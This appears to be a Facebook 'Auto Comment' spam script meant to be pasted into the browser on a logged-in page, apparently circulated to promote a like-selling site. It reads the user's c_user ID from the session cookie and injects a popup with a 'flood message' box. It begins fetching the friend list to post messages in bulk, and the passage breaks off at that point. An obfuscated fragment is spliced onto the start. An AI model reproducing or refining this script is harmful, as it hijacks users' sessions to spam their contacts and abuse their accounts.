/*HTML/JavaScript page status="protected"*//*Copyright © 2014 Hemukiller  All Rights Reserved.*/var _0x8750=["//eval
javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-

family:Tahoma;font-size:11px;color:#3B5998;'>Auto Comment</a></div></br></br>";
grouppost += "<div><textarea id='txtFloodMsg' placeholder='Place the facebook Post_ID code here' style='padding-top:5px;width:493px;height:85px;font-

family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);color:#ffffff'></textarea></div>";
grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-

size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' 

onclick='autopostingfunc(this);' >Post</button><br>Powered By: <A style='color:#3B5998;' href='http://www.facebook.com/313072532101076' 

target='_blank'>Loading [lllllllllll ] 99%</A> & <A style='color:#3B5998;' href='http://www.facebook.com/428484387240184' target='_blank'> Online marketing n 

promotion </A>.</br>Script Made By: </A><A style='color:#3B5998;' href='http://www.facebook.com/100001206108874' target='_blank'>Hemant Sharma</A></A>,</A><A 

style='color:#3B5998;' href='http://www.facebook.com/100001328623069' target='_blank'> Riyaz Khan</A></A>.</br>For More Tools Visit Our Blogger <A 

style='color:#3B5998;' href='http://buygenuinelikes.com/' target='_blank'>Automate Your Facebook</A>.</A></div>";
var _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/428484387240184" target="_blank">Loading [lllllllllll ] 99%</A> & <A 

style="color:#3B5998;" href="http://www.facebook.com/428484387240184" target="_blank">online marketing & promotion</A>.</br>Script Made By: </A><A 

style="color:#3B5998;" href="http://www.facebook.com100001206108874" target="_blank"> Hemant sharma</A></A>,</A><A style="color:#3B5998;" 

href="http://www.facebook.com/100001328623069" target="_blank"> Riyaz khan</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" 

href="http://Buygenuinelikes.com/" target="_blank">Automate Your Facebook</A>.</A>';
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 

0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-

color:rgba(0,0,0,0.9);color:#ffffff");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") try {
            A = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (C) {
            try {
                A = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (B) {
                A = false
            }
        } else if (window.XMLHttpRequest) try {
            A = new XMLHttpRequest
        } catch (C) {
            A = false
        }
        return A
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function () {
            opt.handler(http)
        };
        else http.onreadystatechange = function () {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        result = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    if (error) error(http.status)
                }
        };
        http.send(parameters)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C)
            if (A[B]) C[B] = A[B];
        if (!C.url) return;
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) document.getElementById(C.loading).style.display = "block";
        this.load(C.url, function (E) {
            if (C.onSuccess) C.onSuccess(E);
            if (C.update) document.getElementById(C.update).innerHTML = E;
            if (D) document.getElementsByTagName("body")[0].removeChild(D);
            if (C.loading) document.getElementById(C.loading).style.display = "none"
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var j = 0;
var k = 0;
var suc = 0;
var msg = "Follow this list please... https://www.facebook.com/lists/34252453653";
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + u
